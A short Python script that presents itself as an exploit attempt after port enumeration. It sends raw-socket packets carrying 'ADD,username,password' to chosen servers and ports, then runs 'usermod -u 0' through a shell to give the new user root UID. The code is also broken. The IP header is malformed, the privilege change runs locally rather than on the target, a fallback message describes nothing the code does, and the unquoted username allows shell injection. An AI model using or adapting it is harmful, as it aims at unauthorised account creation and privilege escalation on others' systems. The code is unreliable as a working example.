# code to create several raw socket on input ports and input IPs to create a username and password also attempting to set uid to 0. Please be aware that this is an intermediate attempt at exploiting possible vulnerabilities after enumeration of ports.


import argparse
import socket
import struct
import subprocess

def get_credentials():
    username = input("Enter your username: ")
    password = input("Enter your password: ")
    return (username, password)

def add_user(credentials, server_addresses, ports):
    username, password = credentials

    for server_address, port in zip(server_addresses, ports):
        try:
            # Create raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

            # Build packet with custom payload
            packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 20, 1337, 0, 255, 6, 0, socket.inet_aton(server_address), socket.inet_aton("0.0.0.0"))
            payload = f"ADD,{username},{password}".encode()
            packet += payload

            # Send packet to server
            s.sendto(packet, (server_address, port))

            # Receive response from server
            response = s.recv(1024)
            if response == b"OK":
                print(f"User added successfully to {server_address}:{port}")
                set_uid_to_root(username)
            else:
                print(f"User could not be added to {server_address}:{port}")

        except OSError as e:
            print(f"Failed to establish connection to {server_address}:{port}: {str(e)}")

def set_uid_to_root(username):
    try:
        # Set UID to 0 (root) command for Unix/Linux systems (modify for other platforms)
        command = f"usermod -u 0 {username}"
        subprocess.run(command, shell=True, check=True)
        print(f"UID set to 0 (root) for user '{username}'")

    except subprocess.CalledProcessError as e:
        print(f"Failed to set UID to 0 (root) for user '{username}'. Falling back to UID 10.")

def main():
    parser = argparse.ArgumentParser(description="Authentication client")
    parser.add_argument("--add", action="store_true", help="Add a new user")
    parser.add_argument("--username", type=str, help="Username for new user")
    parser.add_argument("--password", type=str, help="Password for new user")
    parser.add_argument("--servers", nargs="+", type=str, help="Server addresses")
    parser.add_argument("--ports", nargs="+", type=int, help="Port numbers")
    args = parser.parse_args()

    if args.add:
        credentials = (args.username, args.password)
        server_addresses = args.servers
        ports = args.ports
        add_user(credentials, server_addresses, ports)
    else:
        print("No action specified. Use --add to add a new user.")

if __name__ == "__main__":
    main()
